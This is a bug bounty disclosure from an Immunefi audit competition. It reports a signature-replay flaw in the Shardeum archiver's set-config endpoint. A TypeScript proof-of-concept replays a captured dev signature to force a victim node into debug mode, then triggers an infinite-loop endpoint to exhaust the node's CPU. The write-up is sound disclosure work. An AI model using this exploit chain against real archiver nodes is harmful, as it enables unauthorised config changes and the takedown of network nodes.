# #39284 \[W\&A-Medium] Arbitrarily set any archiver config and remotely turning it off

**Submitted on Jan 27th 2025 at 05:13:23 UTC by @Franfran for** [**Audit Comp | Shardeum: Ancillaries III**](https://immunefi.com/audit-competition/audit-comp-shardeum-ancillaries-iii)

* **Report ID:** #39284
* **Report Type:** Websites and Applications
* **Report severity:** Medium
* **Target:** <https://github.com/shardeum/archive-server/tree/itn4>
* **Impacts:**
  * Execute arbitrary system commands
  * Taking and/modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as:
* Changing registration information
* Commenting
* Voting
* Making trades
* Withdrawals, etc.
  * Taking down the application/website

## Description

## Brief/Intro

A `set-config` endpoint request can be intercepted when sent by the dev key in order to be replayed and change arbitrary configuration on any archiver node.\
Some key configuration can be changed which might be very problematic for the network.

## Vulnerability Details

The `set-config` endpoint contains a [pre handler](https://github.com/shardeum/archiver/blob/16c562ba5c7453da8b76b39be27fbd66b9de8972/src/API.ts#L998) called `isDebugMiddleware` which checks if the node was set in debug mode (unlikely for anyone to set their config like this for a production setup), or that the "dev" key signed a message in order to pass that check.\
The issue is that only the `route` and `count` are part of the message, and not the message itself.\
The route in this case would be `"/set-config"`, and the count is the current timestamp in order to avoid replay attacks.\
Knowing this, we can save a message that was sent to us by the dev to alter the config and forward it to another node as long as it didn't received this dev message before us since it works as long as the signed `count` is [greater than the `lastCounter`](https://github.com/shardeum/archiver/blob/2b3fc5322b03afb4b2f6159ee662798b96cb4ca2/src/DebugMode.ts#L35), and alter the new config as wish.

## Impact Details

Some keys cannot be overwritten such as [ARCHIVER\_IP, ARCHIVER\_PORT, ARCHIVER\_HASH\_KEY, ARCHIVER\_SECRET\_KEY, ARCHIVER\_PUBLIC\_KEY](https://github.com/shardeum/archiver/blob/16c562ba5c7453da8b76b39be27fbd66b9de8972/src/API.ts#L1002-L1008).\
Knowing this, we could for instance impersonate the dev by rewriting the `DevPublicKey` or even the `ARCHIVER_MODE` key to completely bypass the `isDebugMiddleware` prehandler.\
This grants us access to some dev-only methods that could cause harm to the node.\
There is the `debug-inf-loop` method which just runs an infinite loop for fun that could be called.

In summary, if the dev sends us a `set-config` first, we could completely take down the entire network of archivers.

## References

Links attached when applicable

## Proof of Concept

## Proof of Concept

Let's modify the script under `scripts/update_config.ts`

```ts
import axios from 'axios'  
import { join } from 'path'  
import { Utils } from '@shardus/types'  
import * as crypto from '@shardus/crypto-utils'  
import { config, overrideDefaultConfig } from '../src/Config'  
import {hashObj} from "@shardus/crypto-utils";  
  
const VICTIM_PORT = 4000;  
  
/////////////////////////////////// SETUP ///////////////////////////////////  
const configFile = join(process.cwd(), 'archiver-config.json')  
overrideDefaultConfig(configFile)  
  
crypto.init(config.ARCHIVER_HASH_KEY)  
  
const DEV_KEYS = {  
    pk: config.ARCHIVER_PUBLIC_KEY,  
    sk: config.ARCHIVER_SECRET_KEY,  
};  
/////////////////////////////////// SETUP ///////////////////////////////////  
  
function sign<T>(obj: T, sk: string, pk: string): T & any {  
  const objCopy = JSON.parse(crypto.stringify(obj))  
  crypto.signObj(objCopy, sk, pk)  
  objCopy["sig"] = objCopy.sign["sig"];  
  return objCopy  
}  
  
function createSignature(data: any, pk: string, sk: string): any {  
  return sign({ ...data }, sk, pk)  
}  
  
async function setConfig(port: number, body: any, query: any) {  
  axios  
      .patch(`http://127.0.0.1:${port}/set-config`, body, {  
        headers: {  
          'Content-Type': 'application/json',  
        },  
        params: query  
      })  
      .then((response) => {  
        console.log(response.data)  
      })  
      .catch((error) => {  
        if (error.response) {  
          console.error(error.response)  
        } else {  
          console.error(error.message)  
        }  
      })  
}  
  
const receiveDevSetConfig = async (): Promise<any> => {  
    const count = new Date().getTime().toString();  
    const query = {  
        route: "/set-config",  
        count: count,  
    };  
    const signed = createSignature(query, DEV_KEYS.pk, DEV_KEYS.sk);  
    signed["sig_counter"] = count;  
  
    // let's say we receive this update from the dev  
    const UPDATE_CONFIG = {  
        VERBOSE: true,  
        RATE_LIMIT: 200,  
    };  
    return signed;  
}  
  
const kill = async () => {  
    axios  
        .get(`http://127.0.0.1:${VICTIM_PORT}/debug-inf-loop`)  
        .then((response) => {  
            console.log(response.data)  
        })  
        .catch((error) => {  
            if (error.response) {  
                console.error(error.response)  
            } else {  
                console.error(error.message)  
            }  
        })  
}  
  
const updateVictimConfig = async (signed: any) => {  
    // set victim config to debug to bypass the prehandler  
    const UPDATE_CONFIG = {  
        ARCHIVER_MODE: 'debug'  
    };  
    const body = Utils.safeStringify(UPDATE_CONFIG);  
    await setConfig(VICTIM_PORT, body, signed);  
    kill();  
}  
  
const runAttack = async () => {  
   const signed = await receiveDevSetConfig();  
   await updateVictimConfig(signed);  
}  
  
runAttack();
```

This POC will:

1. Wait until we receive a `set-config` message from the dev
2. Copy the sig and forward it to another archiver to call the `set-config` endpoint and set their `ARCHIVER_MODE` to `"debug"`
3. Call the `/debug-inf-loop`, see the CPU usage of the archiver and wait for it to get killed

![Image](https://github.com/user-attachments/assets/03ef3a91-332c-422a-ac03-dbd7d8219c8e)
